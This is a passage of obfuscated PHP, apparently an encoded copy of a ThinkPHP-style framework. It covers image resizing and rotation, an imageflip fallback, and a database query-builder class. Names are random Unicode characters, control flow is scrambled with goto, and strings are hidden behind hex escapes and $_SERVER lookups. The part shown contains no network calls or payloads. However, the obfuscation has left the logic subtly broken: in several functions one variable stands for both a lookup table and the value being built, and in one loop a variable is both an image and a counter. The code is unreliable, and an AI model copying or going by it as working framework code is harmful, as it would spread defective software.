$this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($Fֵ, $DΉ); } } function cut($eȌڶ, $c, $C날) { goto bё; Eŋ: $F = $this->creatImage($this->im, $A􊽿, $d, 0, 0, 0, 0, $this->srcW, $this->srcH); $Eٮ = $this->creatImage($F, $c, $C날, 0, 0, ($A􊽿 - $c) / 2, ($d - $C날) / 2, $c, $C날); imageDestroy($F); goto E; E: return $this->echoImage($Eٮ, $eȌڶ); goto a; bё: $Aձ = $c / $C날; $c͍ = $this->srcW / $this->srcH; if ($Aձ <= $c͍) { $d = $C날; $A􊽿 = $d * ($this->srcW / $this->srcH); } else { $A􊽿 = $c; $d = $A􊽿 * ($this->srcH / $this->srcW); } goto Eŋ; a: } function backFill($dܦ꬈, $aؘ, $c, $Cʸ = false, $fײٟ = 255, $F = 255, $Aџ = 255) { goto aۄӴӉ; aۄӴӉ: $d碩 = $aؘ / $c; $fΜ = $this->srcW / $this->srcH; if ($d碩 <= $fΜ) { $F᮫ = $aؘ; $Eۃ = $F᮫ * ($this->srcH / $this->srcW); } else { $Eۃ = $c; $F᮫ = $Eۃ * ($this->srcW / $this->srcH); } goto Dٞ; dϺ: if ($Cʸ) { $C = imageColorTransparent($B, $C); $a = $c - $Eۃ; } imageFilledRectangle($B, 0, 0, $aؘ, $c, $C); if ($this->srcW > $aؘ || $this->srcH > $c) { $bƻ = $this->creatImage($this->im, $F᮫, $Eۃ, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($F᮫ < $aؘ) { imageCopy($B, $bƻ, ($aؘ - $F᮫) / 2, 0, 0, 0, $F᮫, $Eۃ); } else { if ($Eۃ < $c) { imageCopy($B, $bƻ, 0, $a, 0, 0, $F᮫, $Eۃ); } else { imageCopy($B, $bƻ, 0, 0, 0, 0, $F᮫, $Eۃ); } } } else { imageCopyMerge($B, $this->im, ($aؘ - $F᮫) / 2, $a, 0, 0, $F᮫, $Eۃ, 100); } goto f⺕; Dٞ: if (function_exists($_SERVER[ԥ][1831])) { @($B = imageCreateTrueColor($aؘ, $c)); if (!$B) { $B = imageCreate($aؘ, $c); } } else { $B = imageCreate($aؘ, $c); } $a = ($c - $Eۃ) / 2; $C = imagecolorallocate($B, $fײٟ, $F, $Aџ); goto dϺ; f⺕: return $this->echoImage($B, $dܦ꬈); goto D; D: } function creatImage($b, $EΊ, $a, $Bخ, $aԚ, $a, $Eˠ, $d, $Bօ) { if (function_exists($_SERVER[ԥ][1831])) { @($eӉ = ImageCreateTrueColor($EΊ, $a)); @imagealphablending($eӉ, !1); @imagesavealpha($eӉ, !0); if ($eӉ) { imageCopyResampled($eӉ, $b, $Bخ, $aԚ, $a, $Eˠ, $EΊ, $a, $d, $Bօ); } else { $eӉ = ImageCreate($EΊ, $a); imageCopyResized($eӉ, $b, $Bخ, $aԚ, $a, $Eˠ, $EΊ, $a, $d, $Bօ); } } else { $eӉ = ImageCreate($EΊ, $a); imageCopyResized($eӉ, $b, $Bخ, $aԚ, $a, $Eˠ, $EΊ, $a, $d, $Bօ); } return $eӉ; } public function imgRotate($b, $e죋) { goto D; e̍: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $c = imagegif($D҄, $b); break; case IMAGETYPE_JPEG: $c = imagejpeg($D҄, $b, 100); break; case IMAGETYPE_PNG: $c = imagePNG($D҄, $b); break; default: break; } imageDestroy($D҄); imageDestroy($this->im); goto fɜ; fɜ: return $c; goto AǮ; D: if (!$this->im || $e죋 % 360 === 0 || !function_exists($_SERVER[ԥ][1832])) { return !1; } $D҄ = imageRotate($this->im, 360 - $e죋, 0); $c = !1; goto e̍; AǮ: } function echoImage($a, $F) { goto C׈ݐ; b: imageDestroy($this->im); return $Bۡ; goto AӞ; Cئ: $Bۡ = !1; switch ($this->echoType) { case $D[1833]: $Bۡ = imagePNG($a); break; case $D[163]: $Bۡ = imagePNG($a, $F); break; } imageDestroy($a); goto b; C׈ݐ: $D =& $_SERVER[ԥ]; if (!$a) { return !1; } ob_get_clean(); goto Cئ; AӞ: } } if (!function_exists($_SERVER[ԥ][1834])) { define($_SERVER[ԥ][1835], 0); define($_SERVER[ԥ][1836], 1); define($_SERVER[ԥ][1837], 2); function imageflip($Cϗ, $eՔ) { switch ($eՔ) { case IMG_FLIP_HORIZONTAL: $d³ȶ = imagesx($Cϗ) - 1; $C섉 = $d³ȶ / 2; $bା = imagesy($Cϗ); $a = imageistruecolor($Cϗ) ? imagecreatetruecolor(1, $bା) : imagecreate(1, $bା); for ($E̷ = 0; $E̷ < $C섉; ++$E̷) { imagecopy($a, $Cϗ, 0, 0, $E̷, 0, 1, $bା); imagecopy($Cϗ, $Cϗ, $E̷, 0, $d³ȶ - $E̷, 0, 1, $bା); imagecopy($Cϗ, $a, $d³ȶ - $E̷, 0, 0, 0, 1, $bା); } break; case IMG_FLIP_VERTICAL: $A안ۍ = imagesx($Cϗ); $D = imagesy($Cϗ) - 1; $dϿ = $D / 2; $a = imageistruecolor($Cϗ) ? imagecreatetruecolor($A안ۍ, 1) : imagecreate($A안ۍ, 1); for ($a = 0; $a < $dϿ; ++$a) { imagecopy($a, $Cϗ, 0, 0, 0, $a, $A안ۍ, 1); imagecopy($Cϗ, $Cϗ, 0, $a, 0, $D - $a, $A안ۍ, 1); imagecopy($Cϗ, $a, 0, $D - $a, 0, 0, $A안ۍ, 1); } break; case IMG_FLIP_BOTH: $A안ۍ = imagesx($Cϗ); $bା = imagesy($Cϗ); $a = imagerotate($Cϗ, 180, 0); imagecopy($Cϗ, $a, 0, 0, 0, 0, $A안ۍ, $bା); break; default: return; } imagedestroy($a); } } goto fణٯ; f쒪: class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\156\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\145\x71" => "\75", "\x6e\145\161" => "\74\76", "\147\x74" => "\x3e", "\145\147\164" => "\x3e\75", "\x6c\x74" => "\74", "\x65\154\164" => "\x3c\75", "\156\x6f\164\x6c\x69\153\x65" => "\x4e\117\x54\40\114\x49\x4b\x45", "\154\151\153\145" => "\114\x49\113\x45", "\x69\156" => "\x49\x4e", "\156\x6f\164\x69\x6e" => "\x4e\x4f\124\x20\111\x4e", "\156\157\164\40\x69\156" => "\116\117\x54\x20\111\116", "\x62\x65\x74\167\x65\x65\156" => "\x42\x45\124\x57\105\105\x4e", "\156\x6f\164\142\x65\164\167\x65\145\x6e" => "\116\x4f\x54\x20\102\105\124\127\105\105\x4e", "\x6e\x6f\164\40\142\x65\x74\x77\x65\x65\156" => "\116\117\x54\40\102\105\x54\127\x45\105\x4e"); protected $selectSql = "\x53\105\x4c\105\x43\124\x25\104\x49\x53\124\x49\x4e\103\124\x25\40\45\106\111\x45\x4c\104\x25\x20\x46\122\117\x4d\x20\45\x54\101\102\114\105\x25\x25\x4a\117\111\116\45\x25\127\x48\x45\122\105\45\45\x47\122\117\x55\120\x25\45\x48\101\x56\x49\116\x47\x25\x25\117\122\104\x45\122\x25\x25\114\111\115\x49\x54\45\x20\45\x55\x4e\x49\117\116\45\x25\x43\x4f\x4d\x4d\x45\x4e\x54\x25"; protected $bind = array(); public static function getInstance() { $cދꂠ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ԥ][860], $cދꂠ); } public function factory($Bܩ棓 = '') { goto cم; cم: $b =& $_SERVER[ԥ]; $Bܩ棓 = $this->parseConfig($Bܩ棓); if (empty($Bܩ棓[$b[861]])) { think_exception(think_lang($b[862])); } goto f˞Å; f˞Å: $this->dbType = ucwords(strtolower($Bܩ棓[$b[861]])); $aړ = $b[863] . $this->dbType; if (class_exists($aړ)) { $b = new $aړ($Bܩ棓); if ($b[708] != strtolower($Bܩ棓[$b[861]])) { $b->dbType = strtoupper($this->dbType); } else { $b->dbType = $this->_getDsnType($Bܩ棓[$b[813]]); } } else { think_exception(think_lang($b[864]) . $b[865] . $aړ); } goto D͊; D͊: return $b; goto d; d: } public function __call($f, $Dӫڙ) { if (method_exists($this, $f)) { return call_user_func_array(array($this, $f), $Dӫڙ); } } protected function _getDsnType($Dé) { $Fļ = explode($_SERVER[ԥ][4], $Dé); $F = strtoupper(trim($Fļ[0])); return $F; } private function parseConfig($f = '') { $CÆ =& $_SERVER[ԥ]; if (!empty($f) && is_string($f)) { $f = $this->parseDSN($f); } elseif (is_array($f)) { $f = array_change_key_case($f); $f = array($CÆ[861] => $f[$CÆ[707]], $CÆ[786] => $f[$CÆ[866]], $CÆ[787] => $f[$CÆ[867]], $CÆ[784] => $f[$CÆ[868]], $CÆ[785] => $f[$CÆ[869]], $CÆ[17] => $f[$CÆ[870]], $CÆ[813] => $f[$CÆ[709]], $CÆ[13] => isset($f[$CÆ[871]]) ? $f[$CÆ[871]] : array()); } elseif (empty($f)) { if (think_config($CÆ[872]) && $CÆ[708] != strtolower(think_config($CÆ[873]))) { $f = $this->parseDSN(think_config($CÆ[872])); } else { $f = array($CÆ[861] => think_config($CÆ[873]), $CÆ[786] => think_config($CÆ[874]), $CÆ[787] => think_config($CÆ[875]), $CÆ[784] => think_config($CÆ[876]), $CÆ[785] => think_config($CÆ[877]), $CÆ[17] => think_config($CÆ[230]), $CÆ[813] => think_config($CÆ[872]), $CÆ[13] => think_config($CÆ[878])); } } return $f; } protected function initConnect($C̉Œ = true) { if (1 == think_config($_SERVER[ԥ][18])) { $this->_linkID = $this->multiConnect($C̉Œ); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($e؊΢ = false) { $Aۄ =& $_SERVER[ԥ]; static $a = array(); if (empty($a)) { foreach ($this->config as $E؈ => $b޶릲) { $a[$E؈] = explode($Aۄ[47], $b޶릲); } } if (think_config($Aۄ[879])) { if ($e؊΢) { $B = floor(mt_rand(0, think_config($Aۄ[880]) - 1)); } else { if (is_numeric(think_config($Aۄ[881]))) { $B = think_config($Aۄ[881]); } else { $B = floor(mt_rand(think_config($Aۄ[880]), count($a[$Aۄ[784]]) - 1)); } } } else { $B = floor(mt_rand(0, count($a[$Aۄ[784]]) - 1)); } $F͸ = array($Aۄ[786] => isset($a[$Aۄ[786]][$B]) ? $a[$Aۄ[786]][$B] : $a[$Aۄ[786]][0], $Aۄ[787] => isset($a[$Aۄ[787]][$B]) ? $a[$Aۄ[787]][$B] : $a[$Aۄ[787]][0], $Aۄ[784] => isset($a[$Aۄ[784]][$B]) ? $a[$Aۄ[784]][$B] : $a[$Aۄ[784]][0], $Aۄ[785] => isset($a[$Aۄ[785]][$B]) ? $a[$Aۄ[785]][$B] : $a[$Aۄ[785]][0], $Aۄ[17] => isset($a[$Aۄ[17]][$B]) ? $a[$Aۄ[17]][$B] : $a[$Aۄ[17]][0], $Aۄ[813] => isset($a[$Aۄ[813]][$B]) ? $a[$Aۄ[813]][$B] : $a[$Aۄ[813]][0], $Aۄ[13] => isset($a[$Aۄ[13]][$B]) ? $a[$Aۄ[13]][$B] : $a[$Aۄ[13]][0]); return $this->connect($F͸, $B); } public function parseDSN($A𑅻) { $cΈ =& $_SERVER[ԥ]; if (empty($A𑅻)) { return !1; } $cߍ̍ = parse_url($A𑅻); if ($cߍ̍[$cΈ[164]]) { $Fެ = array($cΈ[861] => $cߍ̍[$cΈ[164]], $cΈ[786] => isset($cߍ̍[$cΈ[531]]) ? $cߍ̍[$cΈ[531]] : $cΈ[33], $cΈ[787] => isset($cߍ̍[$cΈ[882]]) ? $cߍ̍[$cΈ[882]] : $cΈ[33], $cΈ[784] => isset($cߍ̍[$cΈ[165]]) ? $cߍ̍[$cΈ[165]] : $cΈ[33], $cΈ[785] => isset($cߍ̍[$cΈ[166]]) ? $cߍ̍[$cΈ[166]] : $cΈ[33], $cΈ[17] => isset($cߍ̍[$cΈ[75]]) ? substr($cߍ̍[$cΈ[75]], 1) : $cΈ[33]); } else { preg_match($cΈ[883], trim($A𑅻), $F); $Fެ = array($cΈ[861] => $F[1], $cΈ[786] => $F[2], $cΈ[787] => $F[3], $cΈ[784] => $F[4], $cΈ[785] => $F[5], $cΈ[17] => $F[6]); } $Fެ[$cΈ[813]] = $cΈ[33]; return $Fެ; } protected function debug() { $bԖ =& $_SERVER[ԥ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $bԖ[884]; if (think_config($bԖ[885])) { think_status($bԖ[886]); think_trace($this->queryStr . $bԖ[887] . think_status($bԖ[20], $bԖ[886], 6) . $bԖ[888], $bԖ[33], $bԖ[889]); } } protected function parseLock($Eǳ = false) { $D =& $_SERVER[ԥ]; if (!$Eǳ) { return $D[33]; } if ($D[815] == $this->dbType) { return $D[890]; } return $D[891]; } protected function parseSet($c޽粮) { $f =& $_SERVER[ԥ]; foreach ($c޽粮 as $D => $b癭) { if (is_array($b癭) && $f[281] == $b癭[0]) { $f[] = $this->parseKey($D) . $f[892] . $b癭[1]; } elseif (is_scalar($b癭) || is_null($b癭)) { $f[] = $this->parseKey($D) . $f[892] . $this->parseValue($b癭); } } return $f[893] . implode($f[47], $f); } protected function bindParam($d, $Cѓ͇) { $this->bind[$_SERVER[ԥ][4] . $d] = $Cѓ͇; } protected function parseBind($BҐ) { $BҐ = array_merge($this->bind, $BҐ); $this->bind = array(); return $BҐ; } function parseKey(&$a⢿Ҽ, $bږ = true) { if ($bږ) { $a⢿Ҽ = $this->parseKeyCheck($a⢿Ҽ); } return $a⢿Ҽ; } function parseKeyCheck($c) { $cϊ =& $_SERVER[ԥ]; $c = trim($c); if (!preg_match($cϊ[894], $c)) { think_exception($cϊ[895] . $c); } return $c; } protected function parseValue($eН܌) { $bߣ =& $_SERVER[ԥ]; if (is_string($eН܌)) { $eН܌ = $bߣ[854] . $this->escapeString($eН܌) . $bߣ[854]; } elseif (isset($eН܌[0]) && is_string($eН܌[0]) && strtolower($eН܌[0]) == $bߣ[281]) { $eН܌ = $this->escapeString($eН܌[1]); } elseif (is_array($eН܌)) { $eН܌ = array_map(array($this, $bߣ[855]), $eН܌); } elseif (is_bool($eН܌)) { $eН܌ = $eН܌ ? $bߣ[83] : $bߣ[464]; } elseif (is_null($eН܌)) { $eН܌ = $bߣ[99]; } return $eН܌; } protected function parseField($Dﾜ) { $D޼昏 =& $_SERVER[ԥ]; if (is_string($Dﾜ) && strpos($Dﾜ, $D޼昏[47])) { $Dﾜ = explode($D޼昏[47], $Dﾜ); } if (is_array($Dﾜ)) { $F䳥Ƃ = array(); foreach ($Dﾜ as $E => $F㘃) { if (!is_numeric($E)) { $F䳥Ƃ[] = $this->parseKey($E) . $D޼昏[896] . $this->parseKey($F㘃); } else { $F䳥Ƃ[] = $this->parseKey($F㘃); } } $eȅ֚ = implode($D޼昏[47], $F䳥Ƃ); } elseif (is_string($Dﾜ) && !empty($Dﾜ)) { $eȅ֚ = $Dﾜ; } else { $eȅ֚ = $D޼昏[172]; } return $eȅ֚; } protected function parseTable($aɅ) { $E͂՟ =& $_SERVER[ԥ]; if (is_array($aɅ)) { $Ďå = array(); foreach ($aɅ as $E => $Bȿĳ) { if (!is_numeric($E)) { $Ďå[] = $this->parseKey($E) . $E͂՟[50] . $this->parseKey($Bȿĳ); } else { $Ďå[] = $this->parseKey($E); } } $aɅ = $Ďå; } elseif (is_string($aɅ)) { if (strstr($aɅ, $E͂՟[50])) { return $aɅ; } $aɅ = explode($E͂՟[47], $aɅ); array_walk($aɅ, array($this, $E͂՟[803])); } return $E͂՟[897] . trim(implode($E͂՟[898], $aɅ), $E͂՟[809]) . $E͂՟[897]; } protected function parseWhere($Dʸ) { $C =& $_SERVER[ԥ]; $C = $C[33]; if (is_string($Dʸ)) { $C = $Dʸ; } else { $F = isset($Dʸ[$C[899]]) ? strtoupper($Dʸ[$C[899]]) : $C[33]; if (in_array($F, array($C[900], $C[901], $C[902]))) { $F = $C[50] . $F . $C[50]; unset($Dʸ[$C[899]]); } else { $F = $C[903]; } foreach ($Dʸ as $CΈ => $D׸䟐) { $C .= $C[261]; if (is_numeric($CΈ)) { $CΈ = $C[904]; } if (0 === strpos($CΈ, $C[70])) { $C .= $this->parseThinkWhere($CΈ, $D׸䟐); } else { if (!preg_match($C[905], trim($CΈ))) { think_exception(think_lang($C[906]) . $C[4] . $CΈ); } $E = is_array($D׸䟐) && isset($D׸䟐[$C[907]]); $CΈ = trim($CΈ); if (strpos($CΈ, $C[267])) { $f󻛗 = explode($C[267], $CΈ); $a = array(); foreach ($f󻛗 as $b => $D) { $A趫 = $E ? $D׸䟐[$b] : $D׸䟐; $a[] = $C[244] . $this->parseWhereItem($this->parseKey($D), $A趫) . $C[802]; } $C .= implode($C[908], $a); } elseif (strpos($CΈ, $C[268])) { $f󻛗 = explode($C[268], $CΈ); $a = array(); foreach ($f󻛗 as $b => $D) { $A趫 = $E ? $D׸䟐[$b] : $D׸䟐; $a[] = $C[244] . $this->parseWhereItem($this->parseKey($D), $A趫) . $C[802]; } $C .= implode($C[903], $a); } else { $C .= $this->parseWhereItem($this->parseKey($CΈ), $D׸䟐); } } $C .= $C[262] . $F; } $C = substr($C, 0, -strlen($F)); } return empty($C) ? $C[33] : $C[909] . $C; } protected function parseWhereItem($D͢, $eє) { $d =& $_SERVER[ԥ]; $A = $d[33]; if (is_array($eє)) { if (is_string($eє[0])) { $cĹ = strtolower($eє[0]); if (in_array($eє[0], array($d[892], $d[910], $d[911], $d[912], $d[913], $d[914]))) { $A .= $D͢ . $d[50] . $eє[0] . $d[50] . $this->parseValue($eє[1]); } elseif (preg_match($d[915], $eє[0])) { $A .= $D͢ . $d[50] . $this->exp[$cĹ] . $d[50] . $this->parseValue($eє[1]); } elseif (preg_match($d[916], $eє[0])) { if (is_array($eє[1])) { $C = isset($eє[2]) ? strtoupper($eє[2]) : $d[901]; if (in_array($C, array($d[900], $d[901], $d[902]))) { $e = array(); foreach ($eє[1] as $B) { $e[] = $D͢ . $d[50] . $this->exp[$cĹ] . $d[50] . $this->parseValue($B); } $A .= $d[244] . implode($d[50] . $C . $d[50], $e) . $d[802]; } } else { $A .= $D͢ . $d[50] . $this->exp[$cĹ] . $d[50] . $this->parseValue($eє[1]); } } elseif ($d[281] == $cĹ) { $A .= $d[800] . $D͢ . $d[50] . $eє[1] . $d[917]; } elseif (preg_match($d[918], $eє[0])) { if (isset($eє[2]) && $d[281] == $eє[2]) { $A .= $D͢ . $d[50] . $this->exp[$cĹ] . $d[50] . $eє[1]; } else { if (is_string($eє[1])) { $eє[1] = explode($d[47], $eє[1]); } $Bی = implode($d[47], $this->parseValue($eє[1])); $A .= $D͢ . $d[50] . $this->exp[$cĹ] . $d[800] . $Bی . $d[802]; } } elseif (preg_match($d[919], $eє[0])) { $Fʝϣֵ = is_string($eє[1]) ? explode($d[47], $eє[1]) : $eє[1]; $A .= $d[800] . $D͢ . $d[50] . $this->exp[$cĹ] . $d[50] . $this->parseValue($Fʝϣֵ[0]) . $d[903] . $this->parseValue($Fʝϣֵ[1]) . $d[262]; } else { think_exception(think_lang($d[906]) . $d[4] . $eє[0]); } } else { $E = count($eє); $bʂ = isset($eє[$E - 1]) ? strtoupper($eє[$E - 1]) : $d[33]; if (in_array($bʂ, array($d[900], $d[901], $d[902]))) { $E = $E - 1; } else { $bʂ = $d[900]; } for ($C䈱å = 0; $C䈱å < $E; $C䈱å++) { $Fʝϣֵ = is_array($eє[$C䈱å]) ? $eє[$C䈱å][1] : $eє[$C䈱å]; if ($d[281] == strtolower($eє[$C䈱å][0])) { $A .= $d[244] . $D͢ . $d[50] . $Fʝϣֵ . $d[917] . $bʂ . $d[50]; } else { $a٫ = is_array($eє[$C䈱å]) ? $this->exp[strtolower($eє[$C䈱å][0])] : $d[892]; if (!$a٫ && is_array($eє[$C䈱å]) && in_array($eє[$C䈱å][0], array($d[892], $d[910], $d[911], $d[912], $d[913], $d[914]))) { $a٫ = $eє[$C䈱å][0]; } $A .= $d[244] . $D͢ . $d[50] . $a٫ . $d[50] . $this->parseValue($Fʝϣֵ) . $d[917] . $bʂ . $d[50]; } } $A = substr($A, 0, -4); } } else { $A .= $D͢ . $d[920] . $this->parseValue($eє); } return $A; } protected function parseThinkWhere($bɷ, $Fף) { $f⸅ =& $_SERVER[ԥ]; $F = $f⸅[33]; switch ($bɷ) { case $f⸅[335]: $F = $Fף; break; case $f⸅[904]: $F = is_string($Fף) ? $Fף : substr($this->parseWhere($Fף), 6); break; case $f⸅[921]: parse_str($Fף, $fڣ); if (isset($fڣ[$f⸅[899]])) { $Cʉ = $f⸅[50] . strtoupper($fڣ[$f⸅[899]]) . $f⸅[50]; unset($fڣ[$f⸅[899]]); } else { $Cʉ = $f⸅[903]; } $bғѺ = array(); foreach ($fڣ as $fԺ => $E܈Σޮ) { $bғѺ[] = $this->parseKey($fԺ) . $f⸅[920] . $this->parseValue($E܈Σޮ); } $F = implode($Cʉ, $bғѺ); break; } return $F; } protected function parseLimit($e՗) { $FŅ =& $_SERVER[ԥ]; return !empty($e՗) ? $FŅ[48] . $e՗ . $FŅ[50] : $FŅ[33]; } protected function parseJoin($dۄп) { $Aᘋ =& $_SERVER[ԥ]; $CąΚ = $Aᘋ[33]; if (!empty($dۄп)) { if (is_array($dۄп)) { foreach ($dۄп as $aֻ => $bɆ) { if (!1 !== stripos($bɆ, $Aᘋ[922])) { $CąΚ .= $Aᘋ[50] . $bɆ; } else { $CąΚ .= $Aᘋ[923] . $bɆ; } } } else { $CąΚ .= $Aᘋ[923] . $dۄп; } } $CąΚ = preg_replace($Aᘋ[924], think_config($Aᘋ[827]) . $Aᘋ[925], $CąΚ); return $CąΚ; } protected function parseOrder($CȒ) { $f =& $_SERVER[ԥ]; if (is_array($CȒ)) { $E띵آ = array(); foreach ($CȒ as $dγá => $eΚ) { if (is_numeric($dγá)) { $E띵آ[] = $this->parseKey($eΚ); } else { $eΚ = in_array(strtoupper(trim($eΚ)), array($f[926], $f[927])) ? $f[50] . $eΚ : $f[33]; if (preg_match($f[928], $dγá)) { $E띵آ[] = $this->parseKey($dγá) . $eΚ; } else { think_exception($f[929] . $dγá); } } } $CȒ = implode($f[47], $E띵آ); } return !empty($CȒ) ? $f[930] . $CȒ : $f[33]; } protected function parseGroup($eݧՓ) { $Bǯ =& $_SERVER[ԥ]; return !empty($eݧՓ) ? $Bǯ[931] . $eݧՓ : $Bǯ[33]; } protected function parseHaving($f㐺) { $e =& $_SERVER[ԥ]; return !empty($f㐺) ? $e[932] . $f㐺 : $e[33]; } protected function parseComment($d) { $B =& $_SERVER[ԥ]; return !empty($d) ? $B[933] . $d . $B[934] : $B[33]; } protected function parseDistinct($dȪ) { $bݞԚ =& $_SERVER[ԥ]; return !empty($dȪ) ? $bݞԚ[935] : $bݞԚ[33]; } protected function parseUnion($f) { $EⱩ =& $_SERVER[ԥ]; if (empty($f)) { return $EⱩ[33]; } if (isset($f[$EⱩ[332]])) { $Fɓ® = $EⱩ[936]; unset($f[$EⱩ[332]]); } else { $Fɓ® = $EⱩ[937]; } foreach ($f as $eћ) { $D[] = $Fɓ® . (is_array($eћ) ? $this->buildSelectSql($eћ) : $eћ); } return implode($EⱩ[50], $D); } public function insert($B㨟, $BĹ = array(), $d愾 = false) { goto f; EۋӍ: foreach ($B㨟 as $Bүš => $A) { if (is_array($A) && $DДɫ[281] == $A[0]) { $E[] = $this->parseKey($Bүš); $c[] = $A[1]; } elseif (is_scalar($A) || is_null($A)) { $E[] = $this->parseKey($Bүš); $c[] = $this->parseValue($A); } } $CǨ뜓 = ($d愾 ? $DДɫ[804] : $DДɫ[805]) . $DДɫ[806] . $this->parseTable($BĹ[$DДɫ[263]]) . $DДɫ[800] . implode($DДɫ[47], $E) . $DДɫ[801] . implode($DДɫ[47], $c) . $DДɫ[802]; $CǨ뜓 .= $this->parseLock(isset($BĹ[$DДɫ[762]]) ? $BĹ[$DДɫ[762]] : !1); goto dݜ; f: $DДɫ =& $_SERVER[ԥ]; $c = $E = array(); $this->model = $BĹ[$DДɫ[265]]; goto EۋӍ; dݜ: $CǨ뜓 .= $this->parseComment(!empty($BĹ[$DДɫ[337]]) ? $BĹ[$DДɫ[337]] : $DДɫ[33]); return $this->execute($CǨ뜓, $this->parseBind(!empty($BĹ[$DДɫ[269]]) ? $BĹ[$DДɫ[269]] : array())); goto F; F: } public function selectInsert($Eٗ, $f˧, $B = array()) { goto c̻; Dۑ: return $this->execute($aۋ, $this->parseBind(!empty($B[$A׉[269]]) ? $B[$A׉[269]] : array())); goto F; dហ͊: array_walk($Eٗ, array($this, $A׉[803])); $aۋ = $A׉[938] . $this->parseTable($f˧) . $A׉[800] . implode($A׉[47], $Eٗ) . $A׉[917]; $aۋ .= $this->buildSelectSql($B); goto Dۑ; c̻: $A׉ =& $_SERVER[ԥ]; $this->model = $B[$A׉[265]]; if (is_string($Eٗ)) { $Eٗ = explode($A׉[47], $Eٗ); } goto dហ͊; F: } public function update($Eе½, $B) { $aՌ =& $_SERVER[ԥ]; $this->model = $B[$aՌ[265]]; $A躖 = $aՌ[939] . $this->parseTable($B[$aՌ[263]]) . $this->parseSet($Eе½) . $this->parseWhere(!empty($B[$aՌ[259]]) ? $B[$aՌ[259]] : $aՌ[33]) . $this->parseOrder(!empty($B[$aՌ[346]]) ? $B[$aՌ[346]] : $aՌ[33]) . $this->parseLimit(!empty($B[$aՌ[276]]) ? $B[$aՌ[276]] : $aՌ[33]) . $this->parseLock(isset($B[$aՌ[762]]) ? $B[$aՌ[762]] : !1) . $this->parseComment(!empty($B[$aՌ[337]]) ? $B[$aՌ[337]] : $aՌ[33]); return $this->execute($A躖, $this->parseBind(!empty($B[$aՌ[269]]) ? $B[$aՌ[269]] : array())); } public function delete($aӢ = array()) { $c٩ =& $_SERVER[ԥ]; $this->model = $aӢ[$c٩[265]]; $a = $c٩[940] . $this->parseTable($aӢ[$c٩[263]]) . $this->parseWhere(!empty($aӢ[$c٩[259]]) ? $aӢ[$c٩[259]] : $c٩[33]) . $this->parseOrder(!empty($aӢ[$c٩[346]]) ? $aӢ[$c٩[346]] : $c٩[33]) . $this->parseLimit(!empty($aӢ[$c٩[276]]) ? $aӢ[$c٩[276]] : $c٩[33]) . $this->parseLock(isset($aӢ[$c٩[762]]) ? $aӢ[$c٩[762]] : !1) . $this->parseComment(!empty($aӢ[$c٩[337]]) ? $aӢ[$c٩[337]] : $c٩[33]); return $this->execute($a, $this->parseBind(!empty($aӢ[$c٩[269]]) ? $aӢ[$c٩[269]] : array())); } public function select($Cѝ = array()) { goto D; D: $Fֱ =& $_SERVER[ԥ]; $this->model = $Cѝ[$Fֱ[265]]; $b¼ = $this->buildSelectSql($Cѝ); goto Dˍ; c۞: if ($Fߚ && !1 !== $EĔ҄) { think_cache($a, $EĔ҄, $Fߚ); } return $EĔ҄; goto ḋɻ; Dˍ: $Fߚ = isset($Cѝ[$Fֱ[333]]) ? $Cѝ[$Fֱ[333]] : !1; if ($Fߚ) { $a = is_string($Fߚ[$Fֱ[89]]) ? $Fߚ[$Fֱ[89]] : $Fֱ[941] . md5($b¼); $A애Ɔ = think_cache($a, $Fֱ[33], $Fߚ); if (!1 !== $A애Ɔ) { return $A애Ɔ; } } $EĔ҄ = $this->query($b¼, $this->parseBind(!empty($Cѝ[$Fֱ[269]]) ? $Cѝ[$Fֱ[269]] : array())); goto c۞; ḋɻ: } public function buildSelectSql($a = array()) { goto E; a㶊: $b = $this->parseSql($this->selectSql, $a); $b .= $this->parseLock(isset($a[$F[762]]) ? $a[$F[762]] : !1); if (isset($A)) { think_cache($A, $b); } goto Aҿ; E: $F =& $_SERVER[ԥ]; if (isset($a[$F[336]])) { if (strpos($a[$F[336]], $F[47])) { list($C׉, $DǍ) = explode($F[47], $a[$F[336]]); } else { $C׉ = $a[$F[336]]; } $C׉ = $C׉ ? $C׉ : 1; $DǍ = isset($DǍ) ? $DǍ : (is_numeric($a[$F[276]]) ? $a[$F[276]] : 20); $Dƌ = $DǍ * ((int) $C׉ - 1); $a[$F[276]] = $Dƌ . $F[47] . $DǍ; } if (think_config($F[942])) { $A = $F[943] . md5(serialize($a)); $DÙ = think_cache($A); if ($DÙ) { return $DÙ; } } goto a㶊; Aҿ: return $b; goto C; C: } public function parseSql($E߆, $eꊖ = array()) { $B۹ =& $_SERVER[ԥ]; $E߆ = str_replace(array($B۹[944], $B۹[945], $B۹[946], $B۹[947], $B۹[948], $B۹[949], $B۹[950], $B۹[951], $B۹[952], $B۹[953], $B۹[954]), array($this->parseTable("{$eꊖ[$B۹[263]]}"), $this->parseDistinct(isset($eꊖ[$B۹[955]]) ? $eꊖ[$B۹[955]] : !1), $this->parseField(!empty($eꊖ[$B۹[257]]) ? $eꊖ[$B۹[257]] : $B۹[172]), $this->parseJoin(!empty($eꊖ[$B۹[266]]) ? $eꊖ[$B۹[266]] : $B۹[33]), $this->parseWhere(!empty($eꊖ[$B۹[259]]) ? $eꊖ[$B۹[259]] : $B۹[33]), $this->parseGroup(!empty($eꊖ[$B۹[956]]) ? $eꊖ[$B۹[956]] : $B۹[33]), $this->parseHaving(!empty($eꊖ[$B۹[957]]) ? $eꊖ[$B۹[957]] : $B۹[33]), $this->parseOrder(!empty($eꊖ[$B۹[346]]) ? $eꊖ[$B۹[346]] : $B۹[33]), $this->parseLimit(!empty($eꊖ[$B۹[276]]) ? $eꊖ[$B۹[276]] : $B۹[33]), $this->parseUnion(!empty($eꊖ[$B۹[331]]) ? $eꊖ[$B۹[331]] : $B۹[33]), $this->parseComment(!empty($eꊖ[$B۹[337]]) ? $eꊖ[$B۹[337]] : $B۹[33])), $E߆); return $E߆; } public function getLastSql($a = '') { return $a ? $this->modelSql[$a] : 